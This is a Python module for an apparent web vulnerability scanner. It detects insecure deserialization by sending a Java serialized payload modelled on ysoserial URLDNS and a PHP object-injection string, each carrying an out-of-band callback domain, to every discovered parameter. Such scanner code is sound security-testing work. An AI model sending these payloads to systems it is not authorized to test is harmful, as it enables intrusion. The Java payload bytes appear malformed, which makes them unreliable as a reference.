import uuid
import base64
import httpx
from typing import List, Tuple, Any
from sqlalchemy.orm import Session
from app.models.observation import ObservationType, Observation
from app.schemas.observation_finding import ObservationCreate
from app.services.observation_service import ObservationService
from app.services.evidence_service import EvidenceService, EvidenceType
from app.models.application_mapping import DiscoveredEndpoint, DiscoveredParameter
from app.models.user import User
from app.services.interaction_service import InteractionService
from app.schemas.interaction import InteractionTokenCreate
from app.core.config import settings

class InsecureDeserializationScanner:
    @staticmethod
    async def scan(
        target_url: str,
        db: Session,
        org_id: uuid.UUID,
        project_id: uuid.UUID,
        user: User
    ) -> List[Tuple[Observation, List[Any]]]:
        observations = []
        
        # Get parameters that might contain serialized objects (base64, XML, Java object streams, PHP serialization)
        # Assuming mapping engine or parameter discovery spots these
        params = db.query(DiscoveredParameter).join(DiscoveredEndpoint).filter(
            DiscoveredEndpoint.org_id == org_id,
            DiscoveredEndpoint.project_id == project_id
        ).all()
        
        # Generate an actual OOB token via InteractionService
        token_in = InteractionTokenCreate(org_id=org_id, project_id=project_id, source_module="INSECURE_DESERIALIZATION")
        db_token = InteractionService.generate_token(db, token_in)
        
        base_domain = settings.OOB_DOMAIN if hasattr(settings, "OOB_DOMAIN") else "localhost:3000/api/oob"
        interaction_domain = f"{db_token.token}.{base_domain}"
        
        # Mock serialized payloads that trigger a DNS/HTTP request upon deserialization
        # e.g., ysoserial URLDNS for Java
        java_urldns_hex = "aced00057372000c6a6176612e6e65742e55524cf60c9ce11a6256ce03000749000868617368436f6465490004706f72744c000466696c657400124c6a6176612f6c616e672f537472696e673b4c0004686f737471007e00014c00046175746871007e00014c000875736572496e666f71007e00014c000372656671007e000170ffffffffffffffff7074000b" + interaction_domain.encode().hex() + "7070707078"
        base64_java_payload = base64.b64encode(bytes.fromhex(java_urldns_hex)).decode()
        
        # E.g., PHP object injection
        php_payload = f'O:14:"SomeClass":1:{{s:4:"ping";s:{len(interaction_domain)}:"{interaction_domain}";}}'
        
        payloads = [
            (base64_java_payload, "Java Serialization"),
            (php_payload, "PHP Serialization")
        ]

        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
            for p in params:
                ep = p.endpoint
                
                # Check for base64 or recognizable serialised structure
                is_candidate = False
                if p.default_value:
                    if str(p.default_value).startswith("O:") or str(p.default_value).startswith("aced") or str(p.default_value).startswith("rO0"):
                        is_candidate = True
                    try:
                        decoded = base64.b64decode(str(p.default_value))
                        if b"aced" in decoded or b"O:" in decoded: # Simplistic check
                            is_candidate = True
                    except:
                        pass
                
                # Test even if not obvious candidate for robustness
                is_candidate = True 
                
                if is_candidate:
                    for payload, fmt_type in payloads:
                        req_data = {}
                        if p.param_type in ["POST", "JSON", "GET"]:
                            req_data[p.name] = payload
                            
                            try:
                                if p.param_type == "GET":
                                    res = await client.request(ep.method, ep.url, params=req_data)
                                elif p.param_type == "JSON":
                                    res = await client.request(ep.method, ep.url, json=req_data)
                                else:
                                    res = await client.request(ep.method, ep.url, data=req_data)
                                    
                                # Verification must rely on InteractionEvents
                                events = InteractionService.get_events_for_token(db, db_token.token)
                                
                                if events:
                                    req_snippet = f"{ep.method} {ep.url}\nPayload: {payload}"
                                    res_snippet = f"HTTP/1.1 {res.status_code} {res.reason_phrase}\n{res.text[:200]}"
                                    oob_evidence = f"Interaction Service confirmed OOB callback for token {db_token.token} with {len(events)} events."
                                    
                                    ev_req = EvidenceService.store_evidence(db, org_id, EvidenceType.REQUEST, req_snippet)
                                    ev_res = EvidenceService.store_evidence(db, org_id, EvidenceType.RESPONSE, res_snippet)
                                    ev_oob = EvidenceService.store_evidence(db, org_id, EvidenceType.TOOL_OUTPUT, oob_evidence)

                                    obs_in = ObservationCreate(
                                        org_id=org_id,
                                        project_id=project_id,
                                        observation_type=ObservationType.INSECURE_DESERIALIZATION,
                                        title=f"Insecure Deserialization ({fmt_type}) at {ep.url}",
                                        fingerprint=f"insecure_deserialization_{ep.url}_{p.name}",
                                        metadata_json={
                                            "endpoint": ep.url,
                                            "parameter": p.name,
                                            "format": fmt_type,
                                            "interaction_token": db_token.token,
                                            "verified_by_oob": True
                                        }
                                    )
                                    obs = ObservationService.create_or_get_observation(db, obs_in, user)
                                    observations.append((obs, [ev_req, ev_res, ev_oob]))
                                    break # Verified for this parameter
                                    
                            except httpx.RequestError:
                                pass
                                
        return observations
